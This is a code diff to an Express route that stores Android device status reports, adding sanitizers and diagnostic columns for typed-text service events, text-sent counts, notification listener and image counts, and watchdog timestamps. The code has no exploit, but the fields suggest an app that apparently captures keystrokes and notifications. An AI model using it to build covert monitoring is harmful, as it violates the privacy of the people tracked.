@@ -13,6 +13,19 @@ const timestampOrNull = (value) => {
     return Number.isNaN(date.getTime()) ? null : date.toISOString()
 }
 
+const nullableBoolean = (value) => {
+    if (value === null || value === undefined || value === '') return null
+    if (typeof value === 'boolean') return value
+    if (value === 'true') return true
+    if (value === 'false') return false
+    return null
+}
+
+const counter = (value) => {
+    const parsed = Number(value)
+    return Number.isFinite(parsed) && parsed >= 0 ? Math.floor(parsed) : 0
+}
+
 router.post('/', async (req, res) => {
     const {
         deviceId,
@@ -32,6 +45,20 @@ router.post('/', async (req, res) => {
         installTime,
         updateTime,
         lastListenerEventAt,
+        typedTextAliveAt,
+        typedTextLastEventAt,
+        typedTextConnected,
+        typedServiceBindTotal,
+        typedEventsTotal,
+        typedTextSentTotal,
+        typedPlaceholderRejectedTotal,
+        typedServiceReconnectTotal,
+        watchdogLastFiredAt,
+        notificationRebindTotal,
+        listenerLastConnectedAt,
+        listenerLastDisconnectedAt,
+        notificationImagesTotal,
+        notificationImagesFailedTotal,
     } = req.body ?? {}
 
     if (!deviceId || !appRole || !packageName) {
@@ -41,7 +68,7 @@ router.post('/', async (req, res) => {
         return res.status(400).json({ error: 'Unknown appRole' })
     }
 
-    const values = [
+    const legacyValues = [
         deviceId,
         appRole,
         packageName,
@@ -61,6 +88,64 @@ router.post('/', async (req, res) => {
         timestampOrNull(lastListenerEventAt),
     ]
 
+    const diagnosticsValues = [
+        timestampOrNull(typedTextAliveAt),
+        timestampOrNull(typedTextLastEventAt),
+        nullableBoolean(typedTextConnected),
+        counter(typedServiceBindTotal),
+        counter(typedEventsTotal),
+        counter(typedTextSentTotal),
+        counter(typedPlaceholderRejectedTotal),
+        counter(typedServiceReconnectTotal),
+        timestampOrNull(watchdogLastFiredAt),
+        counter(notificationRebindTotal),
+        timestampOrNull(listenerLastConnectedAt),
+        timestampOrNull(listenerLastDisconnectedAt),
+        counter(notificationImagesTotal),
+        counter(notificationImagesFailedTotal),
+    ]
+
+    const diagnosticFields = [
+        'typedTextAliveAt',
+        'typedTextLastEventAt',
+        'typedTextConnected',
+        'typedServiceBindTotal',
+        'typedEventsTotal',
+        'typedTextSentTotal',
+        'typedPlaceholderRejectedTotal',
+        'typedServiceReconnectTotal',
+        'watchdogLastFiredAt',
+        'notificationRebindTotal',
+        'listenerLastConnectedAt',
+        'listenerLastDisconnectedAt',
+        'notificationImagesTotal',
+        'notificationImagesFailedTotal',
+    ]
+    const hasDiagnostics = diagnosticFields.some((field) =>
+        Object.prototype.hasOwnProperty.call(req.body ?? {}, field)
+    )
+    const diagnosticsAssignment = [
+        'typed_text_alive_at',
+        'typed_text_last_event_at',
+        'typed_text_connected',
+        'typed_service_bind_total',
+        'typed_events_total',
+        'typed_text_sent_total',
+        'typed_placeholder_rejected_total',
+        'typed_service_reconnect_total',
+        'watchdog_last_fired_at',
+        'notification_rebind_total',
+        'listener_last_connected_at',
+        'listener_last_disconnected_at',
+        'notification_images_total',
+        'notification_images_failed_total',
+    ].map(column =>
+        `${column} = CASE WHEN $${legacyValues.length + diagnosticsValues.length + 1}::boolean ` +
+        `THEN EXCLUDED.${column} ELSE app_status.${column} END`
+    ).join(',\n                ')
+
+    const values = [...legacyValues, ...diagnosticsValues, hasDiagnostics]
+
     try {
         await db.query(
             `INSERT INTO app_status (
@@ -68,9 +153,17 @@ router.post('/', async (req, res) => {
                 listener_enabled, accessibility_enabled, battery_exempt,
                 media_enabled, all_files_access, listener_connected,
                 foreground_service_running, watchdog_enabled, boot_time,
-                install_time, update_time, last_listener_event_at, last_seen
+                install_time, update_time, last_listener_event_at,
+                typed_text_alive_at, typed_text_last_event_at, typed_text_connected,
+                typed_service_bind_total, typed_events_total, typed_text_sent_total,
+                typed_placeholder_rejected_total, typed_service_reconnect_total,
+                watchdog_last_fired_at, notification_rebind_total,
+                listener_last_connected_at, listener_last_disconnected_at,
+                notification_images_total, notification_images_failed_total,
+                last_seen
              )
-             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, NOW())
+             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17,
+                     $18, $19, $20, $21, $22, $23, $24, $25, $26, $27, $28, $29, $30, $31, NOW())
              ON CONFLICT (device_id, app_role) DO UPDATE SET
                 package_name = EXCLUDED.package_name,
                 app_label = EXCLUDED.app_label,
@@ -87,6 +180,7 @@ router.post('/', async (req, res) => {
                 install_time = EXCLUDED.install_time,
                 update_time = EXCLUDED.update_time,
                 last_listener_event_at = EXCLUDED.last_listener_event_at,
+                ${diagnosticsAssignment},
                 last_seen = NOW()`,
             values
         )
@@ -99,7 +193,7 @@ router.post('/', async (req, res) => {
                 install_time, update_time, last_listener_event_at
              )
              VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17)`,
-            values
+            legacyValues
         )
         broadcast('status', { deviceId, appRole, at: new Date().toISOString() })
         return res.json({ status: 'ok' })
